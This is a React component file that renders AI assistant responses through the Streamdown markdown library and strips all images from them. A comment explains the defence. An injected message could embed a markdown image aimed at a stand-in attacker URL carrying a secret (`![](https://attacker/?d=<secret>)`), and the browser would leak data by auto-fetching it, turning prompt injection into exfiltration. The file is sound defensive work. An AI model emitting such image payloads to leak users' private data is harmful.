"use client";

// Vendored from Vercel AI Elements (MIT). Response wraps Streamdown — Vercel's
// streaming-markdown renderer — which handles half-arrived markdown tokens
// gracefully (the fix for mid-stream flicker) and hardens/sanitizes output.
//
// Streamdown's built-in ```mermaid rendering needs the @streamdown/mermaid plugin
// (a devDependency of streamdown, not installed for consumers), so fences render
// as raw code. We register our own diagram renderer via `plugins.renderers`
// instead — see ai/mermaid-renderer.tsx.

import { memo, type ComponentProps } from "react";
import { Streamdown, type PluginConfig } from "streamdown";

import { MermaidRenderer } from "@/components/ai/mermaid-renderer";
import { cn } from "@/lib/utils";

export type ResponseProps = ComponentProps<typeof Streamdown>;

// Stable reference so the memo'd Streamdown isn't re-initialized each render.
const STREAMDOWN_PLUGINS: PluginConfig = {
  renderers: [{ language: "mermaid", component: MermaidRenderer }],
};

// Strip all images from rendered AI output. Streamdown's rehype-harden defaults
// are permissive (allowedImagePrefixes: ["*"], allowDataImages: true), so an
// injected assistant message could embed `![](https://attacker/?d=<secret>)`
// and the browser would auto-fetch it on render — the "external communication"
// leg of the lethal trifecta (this AI also reads private data and ingests
// untrusted web_search / OCR content). disallowedElements removes the <img>
// node before it reaches the DOM, so no src is ever requested. Links keep
// Streamdown's click-confirm safety modal. If a trusted image source is ever
// needed here, switch to the rehype-harden allowedImagePrefixes allowlist.
const DISALLOWED_ELEMENTS = ["img"];

export const Response = memo(
  ({ className, ...props }: ResponseProps) => (
    <Streamdown
      plugins={STREAMDOWN_PLUGINS}
      className={cn(
        "size-full [&>*:first-child]:mt-0 [&>*:last-child]:mb-0 [&_*]:tabular-nums",
        className,
      )}
      {...props}
      disallowedElements={DISALLOWED_ELEMENTS}
    />
  ),
  (prev, next) => prev.children === next.children,
);

Response.displayName = "Response";
